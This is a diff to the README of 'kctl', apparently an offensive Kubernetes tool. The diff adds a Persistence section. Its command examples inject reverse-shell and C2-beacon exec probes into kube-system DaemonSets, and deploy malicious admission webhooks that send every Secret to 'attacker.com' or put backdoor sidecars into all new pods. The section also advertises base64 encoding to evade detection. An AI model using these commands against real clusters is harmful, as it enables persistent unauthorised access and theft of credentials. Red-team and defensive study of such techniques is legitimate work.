@@ -34,6 +34,7 @@
   <a href="#modes">Modes</a> •
   <a href="#commands">Commands</a> •
   <a href="#golden-ticket">Golden Ticket</a> •
+  <a href="#persistence">Persistence</a> •
   <a href="#attack-scenario">Attack Scenario</a> •
   <a href="#defense">Defense</a>
 </p>
@@ -59,6 +60,8 @@
 | `portforward` | Kubelet | Port forwarding through Kubelet API |
 | `pid2pod` | Kubelet | Map Linux PIDs to Pod metadata |
 | `golden` | Kubernetes | Forge certificates and SA tokens (Golden Ticket) |
+| `persist probe-inject` | Kubernetes | Inject exec probes into DaemonSets/Deployments for persistence |
+| `persist webhook-inject` | Kubernetes | Deploy malicious Admission Webhooks for persistence |
 
 ## Installation
 
@@ -266,6 +269,85 @@ kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kub
 | `golden uid-list` | List cached UIDs |
 | `golden test` | Validate key files |
 
+## Persistence
+
+kctl provides two persistence mechanisms for maintaining access to compromised clusters:
+
+### Probe Injection
+
+Inject exec probes into DaemonSets or Deployments to execute commands periodically on every node.
+
+```bash
+# Interactive mode
+persist probe-inject
+
+# Direct injection with reverse shell
+persist probe-inject -d kube-system/kube-proxy --payload reverse-bash --host 10.0.0.100 --port 4444
+
+# HTTP beacon
+persist probe-inject -d monitoring/node-exporter --payload http-curl --url https://c2.attacker.com/beacon
+
+# List workloads with exec probes
+persist probe-list
+
+# Remove injected probes
+persist probe-restore
+```
+
+**Features:**
+- Auto-detect available tools in containers (sh, bash, curl, nc, python, etc.)
+- 9 payload templates (reverse shells, HTTP beacons, custom commands)
+- Support DaemonSet and Deployment workloads
+- Base64 encoding to evade detection
+- Dry-run mode for preview
+
+### Malicious Admission Webhooks
+
+Deploy malicious MutatingWebhooks to intercept and modify Kubernetes resources.
+
+```bash
+# Interactive mode
+persist webhook-inject
+
+# Secret exfiltration - steal all secrets
+persist webhook-inject -t secret-exfil --exfil-url https://attacker.com/collect
+
+# Pod backdoor - inject sidecar into all new pods
+persist webhook-inject -t pod-backdoor --image busybox --command "sh,-c,sleep infinity"
+
+# External webhook server mode (with auto-generated certificates)
+persist webhook-inject -t secret-exfil --external-url https://my-server:8443/webhook --cert-dir ./certs
+
+# List webhooks
+persist webhook-list
+
+# Remove webhooks
+persist webhook-restore
+```
+
+**Attack Types:**
+| Type | Description |
+|------|-------------|
+| `secret-exfil` | Intercept Secret creation/updates and exfiltrate to external server |
+| `pod-backdoor` | Inject malicious sidecar container into all new Pods |
+
+**Deployment Modes:**
+| Mode | Description |
+|------|-------------|
+| In-cluster (default) | Deploy webhook service inside the cluster (~6MB Go binary) |
+| External URL | Use external server as webhook endpoint (certificates auto-generated) |
+
+### Persist Subcommands
+
+| Command | Description |
+|---------|-------------|
+| `persist probe-inject` | Inject exec probes into DaemonSets/Deployments |
+| `persist probe-list` | List workloads with exec probes |
+| `persist probe-restore` | Remove injected probes |
+| `persist webhook-inject` | Deploy malicious admission webhooks |
+| `persist webhook-list` | List webhook configurations |
+| `persist webhook-restore` | Remove injected webhooks |
+
 ## Commands
 
 ### Common Commands (All Modes)
@@ -307,6 +389,12 @@ kctl [kubernetes:10.0.0.1:6443]> golden sa-token --sa-key sa.key --namespace kub
 | `golden update-uid` | Fetch SA UIDs to memory |
 | `golden uid-list` | List cached UIDs |
 | `golden test` | Validate key files |
+| `persist probe-inject` | Inject exec probes for persistence |
+| `persist probe-list` | List workloads with exec probes |
+| `persist probe-restore` | Remove injected probes |
+| `persist webhook-inject` | Deploy malicious webhooks |
+| `persist webhook-list` | List webhook configurations |
+| `persist webhook-restore` | Remove injected webhooks |
 
 ### Network Discovery
 
